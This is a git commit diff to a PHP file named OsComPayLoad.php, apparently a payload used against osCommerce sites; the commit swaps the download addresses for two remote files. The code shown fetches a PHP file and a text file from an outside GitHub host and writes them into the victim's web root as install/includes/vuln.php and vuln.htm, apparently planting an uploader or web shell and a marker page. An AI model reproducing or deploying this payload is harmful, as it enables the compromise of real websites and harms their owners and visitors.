6e917e43dedf2ab61009500bce3faacb773fcc72
redookay <41722689+redookay@users.noreply.github.com>
2018-07-26 09:35:32 +0100

    Update OsComPayLoad.php

--- OsComPayLoad.php
+++ OsComPayLoad.php
@@ -10,7 +10,7 @@ function http_get($url){
 	curl_close($im);
 }
 $check = $_SERVER['DOCUMENT_ROOT'] . "/install/includes/vuln.php" ;
-$text = http_get('https://gist.githubusercontent.com/redookay/04af8650fa04663331746a3e0e670ea1/raw/428440a715d6b8f5f072d3a53295cdad686fae52//up.php');
+$text = http_get('https://raw.githubusercontent.com/redookay/red/master/up.php');
 $open = fopen($check, 'w');
 fwrite($open, $text);
 fclose($open);
@@ -20,7 +20,7 @@ if(file_exists($check)){
   echo "not exits";
 echo "done .\n " ;
 $check2 = $_SERVER['DOCUMENT_ROOT'] . "/vuln.htm" ;
-$text2 = http_get('https://gist.githubusercontent.com/redookay/fd0bcffc94ae2ff90d1d7623c38b9a92/raw/7cd86a4155ec462dd3c9031b02a26f3acc2572a9/vuln.txt');
+$text2 = http_get('https://raw.githubusercontent.com/redookay/red/master/vuln.txt');
 $open2 = fopen($check2, 'w');
 fwrite($open2, $text2);
 fclose($open2);
